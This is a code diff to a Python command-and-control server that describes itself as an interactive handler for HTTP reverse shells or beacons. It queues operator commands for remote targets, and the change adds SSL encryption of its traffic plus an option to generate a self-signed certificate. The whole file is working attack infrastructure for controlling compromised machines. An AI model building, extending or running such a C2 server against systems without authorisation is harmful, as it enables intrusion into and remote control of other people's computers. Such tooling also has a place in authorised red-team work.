@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import multipart
+import ssl
 from io import BytesIO
 import threading
 
@@ -14,6 +15,11 @@ import os
 parser=argparse.ArgumentParser(description='A simple, interactive HTTP handler for HTTP reverse shells or beacons')
 parser.add_argument('-p',"--port", default=80, type=int, required=False, help="The port to listen on")
 parser.add_argument('-a',"--address", default="0.0.0.0", required=False, help="The address to listen on")
+parser.add_argument('-k',"--keyfile", default="key.pem", required=False, help="The path to the SSL key file")
+parser.add_argument('-c',"--certfile", default="cert.pem", required=False, help="The path to the SSL certificate file")
+parser.add_argument('-s',"--ssl", required=False, action="store_true", help="Enable SSL mode")
+parser.add_argument("--setup", required=False, action="store_true", help="Generate SSL certificate and key, then exit")
+
 args = parser.parse_args()
 
 target = "*"
@@ -141,21 +147,33 @@ def prepare(cmd):
             print("No target set. Try '{}' or '{}'".format("targets", ":set target *"))
             return None 
 
-httpd = HTTPServer((args.address, args.port), C2)
-srv_thread = threading.Thread(target=httpd.serve_forever, args=())
-srv_thread.daemon = True
-srv_thread.start()
-print("HTTP Server running on port {}".format(args.port))
-print("{}help for more help".format(cmd_escape))
-session = PromptSession()
-while True:
-    try:
-        with patch_stdout():
-            cmd = session.prompt("{}>".format(target))
-            cmd = prepare(cmd)
-            if cmd:
-                tasks[target].append(cmd)
-                print("Command queued for {}".format(target))
-            #print(tasks)
-    except Exception as e:
-        print(e)
+def main():
+    if args.setup:
+        os.system('openssl req -nodes -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365')
+        print("key.pem and cert.pem created")
+        return
+    httpd = HTTPServer((args.address, args.port), C2)
+    if args.ssl:
+        httpd.socket = ssl.wrap_socket (httpd.socket, 
+                keyfile=args.keyfile, 
+                certfile=args.certfile, server_side=True)
+    srv_thread = threading.Thread(target=httpd.serve_forever, args=())
+    srv_thread.daemon = True
+    srv_thread.start()
+    print("HTTP Server running on port {}".format(args.port))
+    print("{}help for more help".format(cmd_escape))
+    session = PromptSession()
+    while True:
+        try:
+            with patch_stdout():
+                cmd = session.prompt("{}>".format(target))
+                cmd = prepare(cmd)
+                if cmd:
+                    tasks[target].append(cmd)
+                    print("Command queued for {}".format(target))
+                #print(tasks)
+        except Exception as e:
+            print(e)
+
+if __name__=="__main__":
+    main()
